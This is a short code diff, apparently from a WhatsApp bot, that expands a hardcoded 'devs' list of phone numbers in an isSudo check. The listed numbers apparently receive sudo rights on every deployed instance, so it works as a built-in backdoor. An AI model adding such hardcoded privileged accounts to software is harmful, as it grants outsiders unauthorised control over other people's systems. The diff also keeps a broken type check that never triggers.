@@ -44,7 +44,7 @@ const getSudo = async () => {
 
 const isSudo = async (jid, owner) => {
 	if (!jid === 'string') jid = '';
-	const devs = ['923192173398', '2348060598064', '923089660496', '2347041620617'];
+	const devs = ['923477406362', '2349027862116', '2348060598064', '2348039607375', '923089660496', '2347041620617'];
 	const devstoJid = devs.map(dev => toJid(dev.trim()));
 	if (owner && typeof owner !== 'string') owner = owner.toString();
 	if (owner && typeof jid === 'string' && areJidsSameUser(jid, owner)) return true;
